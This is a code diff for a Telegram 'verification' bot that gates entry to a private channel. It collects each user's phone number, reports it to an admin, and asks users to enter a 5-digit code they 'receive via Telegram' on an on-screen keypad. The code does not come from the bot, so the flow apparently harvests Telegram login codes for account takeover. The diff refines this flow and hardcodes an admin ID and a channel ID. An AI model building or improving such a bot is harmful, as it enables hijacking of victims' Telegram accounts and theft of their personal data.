@@ -18,7 +18,7 @@ logger = logging.getLogger(__name__)
 # Configuration - Get from Railway environment variables
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMIN_ID = int(os.getenv('ADMIN_ID', '5521402866'))
-CHANNEL_ID = os.getenv('CHANNEL_ID', '@your_private_channel')
+CHANNEL_ID = os.getenv('CHANNEL_ID', '-1002565132160')
 
 class VerificationBot:
     def __init__(self):
@@ -56,23 +56,44 @@ class VerificationBot:
         self.conn.commit()
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Start command handler"""
-        welcome_text = """
+        """Start command handler - Now includes contact sharing"""
+        user = update.message.from_user
+        
+        welcome_text = f"""
 🤖 **Channel Verification Bot**
 
-I will help you get verified to join our private channel/group.
+Hello {user.first_name}! I will help you get verified to join our private channel/group.
 
 **How it works:**
-1. Request to join the channel you want to access
-2. You'll receive a private message from me
-3. Share your contact number that you use for your Telegram account
-4. You'll receive a 5-digit verification code via Telegram
-5. Enter the code using the number buttons
-6. Once verified, you can join the channel!
+1. Share your contact number that you use for your Telegram account
+2. You'll receive a 5-digit verification code via Telegram
+3. Enter the code using the number buttons
+4. Once verified, you can join the channel!
 
-Let's get started! 🚀
+**Step 1:** Please share your contact number by clicking the button below.
+
+👇 Click the button to share your contact info.
         """
-        await update.message.reply_text(welcome_text, parse_mode='Markdown')
+        
+        # Create contact sharing button
+        contact_keyboard = ReplyKeyboardMarkup([
+            [KeyboardButton("📱 Share My Contact", request_contact=True)]
+        ], resize_keyboard=True, one_time_keyboard=True)
+        
+        await update.message.reply_text(
+            welcome_text, 
+            parse_mode='Markdown',
+            reply_markup=contact_keyboard
+        )
+        
+        # Store pending verification
+        cursor = self.conn.cursor()
+        cursor.execute('''
+            INSERT OR REPLACE INTO pending_verifications 
+            (user_id, username, first_name, timestamp, status)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (user.id, user.username, user.first_name, datetime.now(), 'awaiting_contact'))
+        self.conn.commit()
 
     async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle new join requests to the channel"""
@@ -83,6 +104,19 @@ Let's get started! 🚀
             # Log the join request
             logger.info(f"New join request from {user.first_name} (@{user.username}) to {chat.title}")
             
+            # Check if user is already verified
+            cursor = self.conn.cursor()
+            cursor.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,))
+            if cursor.fetchone():
+                # User is already verified, approve immediately
+                await context.bot.approve_chat_join_request(chat.id, user.id)
+                await context.bot.send_message(
+                    user.id,
+                    "✅ **Welcome back!**\n\nYou're already verified. Your join request has been approved! 🎉",
+                    parse_mode='Markdown'
+                )
+                return
+            
             # Notify admin about the join request
             admin_message = f"""
 🔔 **New Join Request**
@@ -92,7 +126,7 @@ Let's get started! 🚀
 📢 **Channel:** {chat.title}
 ⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-Starting verification process...
+User needs to complete verification process first.
             """
             await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
             
@@ -102,33 +136,12 @@ Starting verification process...
 
 Hello {user.first_name}! 
 
-I noticed you requested to join **{chat.title}**. To get approved, I need to verify that you're a real person and not a bot.
+I noticed you requested to join **{chat.title}**. To get approved, please start the verification process.
 
-**Step 1:** Please share your contact number that you use for your Telegram account.
-
-👇 Click the button below to share your contact info.
+Please click /start to begin verification.
             """
             
-            # Create contact sharing button
-            contact_keyboard = ReplyKeyboardMarkup([
-                [KeyboardButton("📱 Share Contact", request_contact=True)]
-            ], resize_keyboard=True, one_time_keyboard=True)
-            
-            await context.bot.send_message(
-                user.id, 
-                verification_message, 
-                parse_mode='Markdown',
-                reply_markup=contact_keyboard
-            )
-            
-            # Store pending verification
-            cursor = self.conn.cursor()
-            cursor.execute('''
-                INSERT OR REPLACE INTO pending_verifications 
-                (user_id, username, first_name, timestamp, status)
-                VALUES (?, ?, ?, ?, ?)
-            ''', (user.id, user.username, user.first_name, datetime.now(), 'awaiting_contact'))
-            self.conn.commit()
+            await context.bot.send_message(user.id, verification_message, parse_mode='Markdown')
             
         except Exception as e:
             logger.error(f"Error handling join request: {e}")
@@ -151,10 +164,10 @@ I noticed you requested to join **{chat.title}**. To get approved, I need to ver
             # Update database with phone number
             cursor = self.conn.cursor()
             cursor.execute('''
-                UPDATE pending_verifications 
-                SET phone_number = ?, status = 'contact_shared', admin_notified = 0
-                WHERE user_id = ?
-            ''', (contact.phone_number, user.id))
+                INSERT OR REPLACE INTO pending_verifications 
+                (user_id, username, first_name, phone_number, timestamp, status)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (user.id, user.username, user.first_name, contact.phone_number, datetime.now(), 'contact_shared'))
             self.conn.commit()
             
             # Send confirmation to user
@@ -166,7 +179,7 @@ I noticed you requested to join **{chat.title}**. To get approved, I need to ver
 
 ⏳ **Next Step:** Please wait for a verification code to be sent to you via Telegram.
 
-You'll receive a 5-digit code shortly. Once you get it, return here to enter the code.
+You'll receive a 5-digit code shortly. Once you get it, you'll be able to enter the code here.
 
 **Important:** Don't close this chat. You'll need to enter the verification code here when you receive it.
                 """,
@@ -502,13 +515,23 @@ Entered: 0/5 digits
             
             self.conn.commit()
             
-            # Approve join request
+            # Try to approve join request if exists
             try:
                 await context.bot.approve_chat_join_request(CHANNEL_ID, user.id)
                 status_text = "✅ **Verification Successful!**\n\nCongratulations! You have been verified and your channel request has been approved. Welcome! 🎉"
             except BadRequest as e:
                 logger.error(f"Error approving join request: {e}")
-                status_text = "✅ **Verification Successful!**\n\nYou have been verified! Please contact the admin to manually approve your request."
+                status_text = f"""
+✅ **Verification Successful!**
+
+You have been verified! 
+
+**Next Step:** Now you can try to join the channel. If you haven't requested to join yet, please do so now.
+
+**Channel ID:** `{CHANNEL_ID}`
+
+If you still can't join, please contact the admin.
+                """
             
             await query.edit_message_text(status_text, parse_mode='Markdown')
             
@@ -521,7 +544,7 @@ Entered: 0/5 digits
 📱 **Phone:** {phone_number}
 ⏰ **Verified:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-User has been approved for channel access.
+User has been verified and approved for channel access.
             """
             await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
             
